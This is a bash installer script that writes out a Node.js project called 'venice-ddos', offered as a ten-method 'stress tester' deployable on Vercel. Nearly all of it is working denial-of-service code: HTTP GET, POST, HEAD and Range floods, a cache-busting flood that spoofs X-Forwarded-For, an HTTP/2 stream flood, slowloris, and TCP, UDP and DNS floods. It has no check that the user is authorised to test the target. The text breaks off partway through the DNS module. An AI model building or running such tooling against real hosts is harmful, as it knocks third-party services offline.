#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"

mkdir -p api lib lib/methods scripts public
rm -f lib/methods/engine.js   # the misplaced copy, if it's still there

echo "==> writing 26 files"

cat > package.json <<'JSON'
{
  "name": "venice-ddos",
  "version": "3.1.0",
  "private": true,
  "description": "Ten-method Layer 4/7 stress tester. Runs on Vercel or locally.",
  "main": "local.js",
  "engines": { "node": ">=18" },
  "scripts": {
    "start": "node local.js",
    "dev": "vercel dev",
    "deploy": "vercel --prod",
    "swarm": "node swarm.js",
    "test": "node scripts/smoke.js",
    "smoke": "node scripts/smoke.js"
  },
  "dependencies": {
    "@vercel/functions": "^1.0.0"
  }
}
JSON

cat > vercel.json <<'JSON'
{
  "$schema": "https://openapi.vercel.sh/vercel.json",
  "functions": {
    "api/*.js": { "maxDuration": 300, "memory": 1024 }
  }
}
JSON

cat > .gitignore <<'IGN'
node_modules/
.vercel/
.env
.env*.local
*.log
.DS_Store
IGN

cat > lib/stats.js <<'JS'
'use strict';

class Stats {
  constructor() { this.reset(); }

  reset() {
    this.reqs = 0;
    this.bytes = 0;
    this.errors = 0;
    this.conns = 0;
    this.connsOpened = 0;
    this.startedAt = Date.now();
    this.last = { t: Date.now(), reqs: 0, bytes: 0, errors: 0 };
  }

  hit(bytes = 0) { this.reqs++; this.bytes += bytes; }
  err() { this.reqs++; this.errors++; }
  open() { this.conns++; this.connsOpened++; }
  close() { this.conns--; }

  snapshot() {
    const now = Date.now();
    const dt = Math.max(1, now - this.last.t) / 1000;
    const dReqs = this.reqs - this.last.reqs;
    const dBytes = this.bytes - this.last.bytes;
    const dErr = this.errors - this.last.errors;
    this.last = { t: now, reqs: this.reqs, bytes: this.bytes, errors: this.errors };

    return {
      uptime: (now - this.startedAt) / 1000,
      total: {
        reqs: this.reqs,
        bytes: this.bytes,
        errors: this.errors,
        connsOpen: this.conns,
        connsOpened: this.connsOpened,
      },
      rate: {
        rps: dReqs / dt,
        bps: (dBytes * 8) / dt,
        errorsPerSec: dErr / dt,
      },
    };
  }
}

module.exports = { Stats };
JS

cat > lib/engine.js <<'JS'
'use strict';

const dns = require('dns');
const METHODS = require('./methods');
const { Stats } = require('./stats');

// Vercel gives 1024 file descriptors per instance, shared with the runtime.
const MAX_CONCURRENCY = 900;

const ALIASES = {
  get: 'http-get', httpget: 'http-get',
  post: 'http-post', httppost: 'http-post',
  head: 'http-head', httphead: 'http-head',
  h2: 'http2', http2: 'http2',
  slow: 'slowloris', slowloris: 'slowloris', slowhttp: 'slowloris',
  range: 'range', bytes: 'range',
  random: 'random', rand: 'random', cache: 'random', cachebuster: 'random',
  tcp: 'tcp', tcpconnect: 'tcp', connect: 'tcp',
  udp: 'udp',
  dns: 'dns', dnsq: 'dns',
};

const PRESETS = {
  mix: ['http-get', 'http-post', 'http-head', 'http2', 'range', 'random'],
  all: ['http-get', 'http-post', 'http-head', 'http2', 'slowloris', 'range', 'random', 'tcp', 'udp', 'dns'],
};

const clamp = (n, lo, hi) => Math.min(Math.max(n, lo), hi);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function resolveMethods(spec) {
  const raw = String(spec || 'http-get').toLowerCase().trim();
  if (PRESETS[raw]) return PRESETS[raw].slice();

  const names = raw.split(/[,+\s]+/).filter(Boolean).map((token) => {
    const key = token.replace(/[^a-z0-9]/g, '');
    const canonical = ALIASES[key] || key;
    if (!METHODS[canonical]) {
      throw new Error(`Unknown method "${token}". Try: ${Object.keys(METHODS).join(', ')}, mix, all`);
    }
    return canonical;
  });

  return [...new Set(names)];
}

function parseTarget(input, opts = {}) {
  if (!input) throw new Error('A target is required.');

  let s = String(input).trim();
  if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(s)) s = `http://${s}`;

  let u;
  try { u = new URL(s); } catch { throw new Error(`Invalid target "${input}"`); }

  const secure = u.protocol === 'https:';
  const explicitPort = Boolean(u.port || opts.port);
  const port = opts.port ? Number(opts.port) : u.port ? Number(u.port) : secure ? 443 : 80;

  if (!Number.isFinite(port) || port < 1 || port > 65535) throw new Error(`Invalid port "${port}"`);

  return {
    input: String(input),
    scheme: u.protocol.replace(':', ''),
    secure,
    host: u.hostname,
    port,
    explicitPort,
    hostHeader: u.port ? `${u.hostname}:${u.port}` : u.hostname,
    path: `${u.pathname || '/'}${u.search || ''}`,
    ip: null,
  };
}

async function resolveTarget(input, opts) {
  const target = parseTarget(input, opts);
  target.ip = await new Promise((resolve) => {
    dns.lookup(target.host, { family: 0 }, (err, address) => resolve(err ? null : address));
  });
  return target;
}

// Splits the socket budget across methods in proportion to each method's own
// default, instead of averaging the defaults and then dividing by method count.
function concurrencyBudget(methods, requested) {
  const weights = methods.map((m) => METHODS[m].defaults.concurrency || 300);
  const totalWeight = weights.reduce((a, b) => a + b, 0);

  const total = requested
    ? clamp(Number(requested), 1, MAX_CONCURRENCY)
    : Math.min(totalWeight, MAX_CONCURRENCY);

  return weights.map((w) => Math.max(1, Math.round((total * w) / totalWeight)));
}

async function run(opts, onTick) {
  const target = await resolveTarget(opts.target, opts);
  const methods = resolveMethods(opts.method);
  const budget = concurrencyBudget(methods, opts.concurrency);
  const concurrency = budget.reduce((a, b) => a + b, 0);
  const duration = clamp(Number(opts.duration) || 15, 1, 800);

  const stats = new Stats();
  const ctx = { target, stats, opts, running: true };

  const runners = [];
  const workers = [];

  for (let mi = 0; mi < methods.length; mi++) {
    const name = methods[mi];
    const runner = METHODS[name].create(ctx);
    runners.push({ name, runner });
    for (let i = 0; i < budget[mi]; i++) {
      workers.push(Promise.resolve().then(() => runner.worker(i)).catch(() => {}));
    }
  }

  let peakRps = 0;
  let peakBps = 0;
  const history = [];

  const ticker = setInterval(() => {
    const snap = stats.snapshot();
    peakRps = Math.max(peakRps, snap.rate.rps);
    peakBps = Math.max(peakBps, snap.rate.bps);
    history.push({
      t: Number(snap.uptime.toFixed(1)),
      rps: Math.round(snap.rate.rps),
      mbps: Number((snap.rate.bps / 1e6).toFixed(2)),
    });
    if (onTick) { try { onTick(snap); } catch {} }
  }, 1000);

  const startedAt = Date.now();
  await sleep(duration * 1000);
  ctx.running = false;

  for (const { runner } of runners) {
    if (typeof runner.destroy === 'function') { try { runner.destroy(); } catch {} }
  }
  await Promise.race([Promise.allSettled(workers), sleep(4000)]);
  clearInterval(ticker);

  const final = stats.snapshot();
  const elapsed = Math.max(1, (Date.now() - startedAt) / 1000);

  const perMethod = {};
  methods.forEach((m, i) => { perMethod[m] = budget[i]; });

  return {
    target: { input: target.input, host: target.host, ip: target.ip, port: target.port, secure: target.secure },
    methods,
    perMethod,
    concurrency,
    durationSec: Number(elapsed.toFixed(2)),
    totals: {
      requests: final.total.reqs,
      errors: final.total.errors,
      bytesReceived: final.total.bytes,
      megabytesReceived: Number((final.total.bytes / 1048576).toFixed(2)),
      connectionsOpened: final.total.connsOpened,
    },
    averages: {
      rps: Math.round(final.total.reqs / elapsed),
      mbps: Number(((final.total.bytes * 8) / 1e6 / elapsed).toFixed(2)),
    },
    peak: {
      rps: Math.round(peakRps),
      mbps: Number((peakBps / 1e6).toFixed(2)),
    },
    history,
  };
}

module.exports = { run, parseTarget, resolveMethods, concurrencyBudget, MAX_CONCURRENCY, METHODS };
JS

cat > lib/methods/_http.js <<'JS'
'use strict';

const http = require('http');
const https = require('https');

function createAgent(target, opts) {
  const mod = target.secure ? https : http;
  return new mod.Agent({
    keepAlive: true,
    keepAliveMsecs: Number(opts.keepAliveMsecs) || 30000,
    maxSockets: Infinity,
    maxFreeSockets: 256,
    scheduling: 'lifo',
    timeout: Number(opts.socketTimeout) || 10000,
  });
}

function baseHeaders(target, opts) {
  return {
    Host: target.hostHeader,
    'User-Agent': opts.userAgent || 'Venice-DDoS/3.1',
    Accept: '*/*',
    'Accept-Encoding': 'identity',
    Connection: 'keep-alive',
  };
}

function once(ctx, agent, spec) {
  const { target, stats, opts } = ctx;
  const mod = target.secure ? https : http;

  return new Promise((resolve) => {
    let settled = false;
    const finish = (err, bytes) => {
      if (settled) return;
      settled = true;
      if (err) stats.err(); else stats.hit(bytes || 0);
      resolve();
    };

    const req = mod.request(
      {
        hostname: target.host,
        port: target.port,
        path: spec.path || target.path,
        method: spec.method || 'GET',
        agent,
        servername: target.secure ? target.host : undefined,
        rejectUnauthorized: false,
        headers: Object.assign(baseHeaders(target, opts), spec.headers),
      },
      (res) => {
        if (spec.method === 'HEAD') {
          res.resume();
          finish(null, Number(res.headers['content-length']) || 0);
          return;
        }
        let bytes = 0;
        res.on('data', (c) => { bytes += c.length; });
        res.on('end', () => finish(null, bytes));
        res.on('aborted', () => finish(new Error('aborted'), bytes));
        res.on('error', () => finish(new Error('res'), bytes));
      }
    );

    req.on('error', () => finish(new Error('req')));
    req.setTimeout(Number(opts.socketTimeout) || 10000, () => req.destroy(new Error('timeout')));
    req.end(spec.body);
  });
}

function createHttpMethod(ctx, build) {
  const agent = createAgent(ctx.target, ctx.opts);
  return {
    async worker() {
      while (ctx.running) await once(ctx, agent, build());
    },
    destroy() { try { agent.destroy(); } catch {} },
  };
}

module.exports = { createHttpMethod, createAgent, once };
JS

cat > lib/methods/index.js <<'JS'
'use strict';

module.exports = {
  'http-get': require('./http-get'),
  'http-post': require('./http-post'),
  'http-head': require('./http-head'),
  'http2': require('./http2'),
  'slowloris': require('./slowloris'),
  'range': require('./range'),
  'random': require('./random'),
  'tcp': require('./tcp'),
  'udp': require('./udp'),
  'dns': require('./dns'),
};
JS

cat > lib/methods/http-get.js <<'JS'
'use strict';
const { createHttpMethod } = require('./_http');

module.exports = {
  name: 'HTTP-GET',
  layer: 7,
  summary: 'Keep-alive GET flood that fully drains responses. Best all-rounder.',
  defaults: { concurrency: 600 },
  create(ctx) {
    return createHttpMethod(ctx, () => ({ method: 'GET', path: ctx.target.path }));
  },
};
JS

cat > lib/methods/http-post.js <<'JS'
'use strict';
const { createHttpMethod } = require('./_http');

module.exports = {
  name: 'HTTP-POST',
  layer: 7,
  summary: 'POST flood with a correct Content-Length body. Hits app servers far harder than GET.',
  defaults: { concurrency: 400 },
  create(ctx) {
    const body = Buffer.from(ctx.opts.payload || 'v=1&t=venice');
    return createHttpMethod(ctx, () => ({
      method: 'POST',
      path: ctx.target.path,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': String(body.length),
      },
      body,
    }));
  },
};
JS

cat > lib/methods/http-head.js <<'JS'
'use strict';
const { createHttpMethod } = require('./_http');

module.exports = {
  name: 'HTTP-HEAD',
  layer: 7,
  summary: 'HEAD flood. No response body means the highest requests/sec achievable.',
  defaults: { concurrency: 800 },
  create(ctx) {
    return createHttpMethod(ctx, () => ({ method: 'HEAD', path: ctx.target.path }));
  },
};
JS

cat > lib/methods/range.js <<'JS'
'use strict';
const { createHttpMethod } = require('./_http');

module.exports = {
  name: 'HTTP-RANGE',
  layer: 7,
  summary: 'GET with Range: bytes=0-1. Tiny 206 responses, maximum requests per socket.',
  defaults: { concurrency: 800 },
  create(ctx) {
    return createHttpMethod(ctx, () => ({
      method: 'GET',
      path: ctx.target.path,
      headers: { Range: 'bytes=0-1' },
    }));
  },
};
JS

cat > lib/methods/random.js <<'JS'
'use strict';
const { createHttpMethod } = require('./_http');

const UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  'curl/8.6.0',
  'python-requests/2.32.0',
  'Venice-DDoS/3.1',
];

const rand = () => Math.random().toString(36).slice(2, 10);

module.exports = {
  name: 'HTTP-RANDOM',
  layer: 7,
  summary: 'Cache-buster flood: unique query string + rotating headers to defeat CDN caching.',
  defaults: { concurrency: 600 },
  create(ctx) {
    const base = ctx.target.path;
    const join = base.includes('?') ? '&' : '?';
    return createHttpMethod(ctx, () => ({
      method: Math.random() < 0.5 ? 'GET' : 'HEAD',
      path: `${base}${join}__cb=${rand()}${rand()}`,
      headers: {
        'User-Agent': UAS[(Math.random() * UAS.length) | 0],
        'Cache-Control': 'no-cache, no-store',
        Pragma: 'no-cache',
        'X-Forwarded-For': `${(Math.random() * 255) | 0}.${(Math.random() * 255) | 0}.${(Math.random() * 255) | 0}.${(Math.random() * 255) | 0}`,
      },
    }));
  },
};
JS

cat > lib/methods/http2.js <<'JS'
'use strict';
const http2 = require('http2');

module.exports = {
  name: 'HTTP2',
  layer: 7,
  summary: 'Multiplexed HTTP/2 stream flood over a few TLS sessions. Brutal against h2 origins.',
  defaults: { concurrency: 400, sessions: 4 },
  create(ctx) {
    const { target, stats, opts } = ctx;
    const authority = `${target.scheme}://${target.hostHeader}`;
    const wanted = Math.max(1, Math.min(Number(opts.sessions) || 4, 32));
    const sessions = new Array(wanted).fill(null);

    const connectAt = (idx) => {
      const s = http2.connect(authority, { rejectUnauthorized: false });
      s.on('error', () => {});
      sessions[idx] = s;
      return s;
    };
    for (let i = 0; i < wanted; i++) connectAt(i);

    return {
      async worker(i) {
        while (ctx.running) {
          const slot = i % wanted;
          let session = sessions[slot];
          if (!session || session.destroyed || session.closed) session = connectAt(slot);

          await new Promise((resolve) => {
            let settled = false;
            const done = (err, bytes) => {
              if (settled) return;
              settled = true;
              if (err) stats.err(); else stats.hit(bytes || 0);
              resolve();
            };
            let req;
            try {
              req = session.request({
                ':method': 'GET',
                ':path': target.path,
                'accept-encoding': 'identity',
              });
            } catch (e) { return done(new Error('stream')); }

            let bytes = 0;
            req.on('data', (c) => { bytes += c.length; });
            req.on('end', () => done(null, bytes));
            req.on('error', () => done(new Error('stream-error'), bytes));
            req.setTimeout(Number(opts.socketTimeout) || 10000, () => {
              try { req.close(); } catch {}
              done(new Error('h2-timeout'));
            });
            req.end();
          });
        }
      },
      destroy() {
        for (const s of sessions) { if (s) { try { s.destroy(); } catch {} } }
      },
    };
  },
};
JS

cat > lib/methods/slowloris.js <<'JS'
'use strict';
const net = require('net');
const tls = require('tls');

module.exports = {
  name: 'SLOWLORIS',
  layer: 7,
  summary: 'Holds hundreds of half-open HTTP sockets, trickling header pads to exhaust the accept queue.',
  defaults: { concurrency: 500, slowInterval: 1500 },
  create(ctx) {
    const { target, stats, opts } = ctx;
    const sockets = new Set();
    const interval = Math.max(100, Number(opts.slowInterval) || 1500);

    const dial = () =>
      target.secure
        ? tls.connect({ host: target.host, port: target.port, rejectUnauthorized: false, servername: target.host })
        : net.connect({ host: target.host, port: target.port });

    return {
      async worker() {
        while (ctx.running) {
          await new Promise((resolve) => {
            const sock = dial();
            sockets.add(sock);
            stats.open();

            let settled = false;
            let armed = false;
            let timer = null;

            const finish = (err) => {
              if (settled) return;
              settled = true;
              if (timer) clearInterval(timer);
              sockets.delete(sock);
              stats.close();
              if (err) stats.err(); else stats.hit(0);
              try { sock.destroy(); } catch {}
              resolve();
            };

            const arm = () => {
              if (armed) return;
              armed = true;
              sock.write(
                `GET ${target.path} HTTP/1.1\r\n` +
                `Host: ${target.hostHeader}\r\n` +
                `User-Agent: ${opts.userAgent || 'Venice-DDoS/3.1'}\r\n` +
                `Accept: */*\r\n`
              );
              timer = setInterval(() => {
                if (!sock.writable) return;
                try {
                  sock.write(`X-Pad-${Date.now().toString(36)}: ${Math.random().toString(36).slice(2)}\r\n`);
                } catch {}
              }, interval);
            };

            sock.once('connect', arm);
            if (target.secure) sock.once('secureConnect', arm);
            sock.on('error', () => finish(new Error('sock')));
            sock.on('close', () => finish(null));
            sock.on('end', () => finish(null));
            sock.setTimeout(0);
          });
        }
      },
      destroy() { for (const s of sockets) { try { s.destroy(); } catch {} } },
    };
  },
};
JS

cat > lib/methods/tcp.js <<'JS'
'use strict';
const net = require('net');

module.exports = {
  name: 'TCP-CONNECT',
  layer: 4,
  summary: 'Opens and drops raw TCP connections as fast as the target can accept them.',
  defaults: { concurrency: 600 },
  create(ctx) {
    const { target, stats, opts } = ctx;
    const payload = opts.payload ? Buffer.from(opts.payload) : null;
    const host = target.ip || target.host;

    return {
      async worker() {
        while (ctx.running) {
          await new Promise((resolve) => {
            const sock = net.connect({ host, port: target.port });
            stats.open();

            let settled = false;
            const done = (err) => {
              if (settled) return;
              settled = true;
              stats.close();
              if (err) stats.err(); else stats.hit(payload ? payload.length : 0);
              try { sock.destroy(); } catch {}
              resolve();
            };

            sock.on('connect', () => {
              if (payload) { try { sock.write(payload); } catch {} }
              done(null);
            });
            sock.on('error', () => done(new Error('tcp')));
            sock.setTimeout(Number(opts.socketTimeout) || 8000, () => done(new Error('timeout')));
          });
        }
      },
    };
  },
};
JS

cat > lib/methods/udp.js <<'JS'
'use strict';
const dgram = require('dgram');

module.exports = {
  name: 'UDP',
  layer: 4,
  summary: 'Blasts fixed-size UDP datagrams at the target port. Great for game servers and DNS.',
  defaults: { concurrency: 50, payloadSize: 1024 },
  create(ctx) {
    const { target, stats, opts } = ctx;
    const size = Math.min(Math.max(Number(opts.payloadSize) || 1024, 1), 65507);
    const payload = Buffer.alloc(size, 0x41);
    const host = target.ip || target.host;
    const sockets = [];
    const maxInflight = 4096;

    return {
      async worker() {
        const sock = dgram.createSocket('udp4');
        sock.on('error', () => {});
        sockets.push(sock);
        await new Promise((r) => sock.bind(0, () => r()));

        let inflight = 0;
        while (ctx.running) {
          if (inflight >= maxInflight) {
            await new Promise((r) => setImmediate(r));
            continue;
          }
          inflight++;
          sock.send(payload, target.port, host, (err) => {
            inflight--;
            if (err) stats.err(); else stats.hit(payload.length);
          });
        }
      },
      destroy() { for (const s of sockets) { try { s.close(); } catch {} } },
    };
  },
};
JS

cat > lib/methods/dns.js <<'JS'
'use strict';
const dgram = require('dgram');

function buildQuery(name, type = 1) {
  const header = Buffer.alloc(12);
  header.writeUInt16BE(Math.floor(Math.random() * 65536), 0);
  header.writeUInt16BE(0x0100, 2);
  header.writeUInt16BE(1, 4);

  const labels = name.split('.').filter(Boolean).map((label) => {
    const b = Buffer.from(label);
    return Buffer.concat([Buffer.from([b.length]), b]);
  });
  const qname = Buffer.concat([...labels, Buffer.from([0])]);

  const tail = Buffer.alloc(4);
  tail.writeUInt16BE(type, 0);
  tail.writeUInt16BE(1, 2);

  return Buffer.concat([header, qname, tail]);
}

module.exports = {
  name: 'DNS-QUERY',
  layer: 4,
  summary: 'UDP DNS query flood with random labels, so nothing can be answered from cache.',
  defaults: { concurrency: 40 },
  create(ctx) {
    const { target, stats, opts } = ctx;
    const host = target.ip || target.host;
    const port = target.explicitPort ? target.port : 53;
    const zone = opts.payload || 'venice.ai';
    const sockets = [];
    const maxInflight = 2048;

    return {
      async worker() {
        const sock = dgram.createSocket('udp4');
        sock.on('error', () => {});
        sockets.push(sock);
        await new Promise((r) => sock.bind(0, () => r()));

        let inflight = 0;
        while (ctx.running) {
          if (inflight >= maxInflight) {
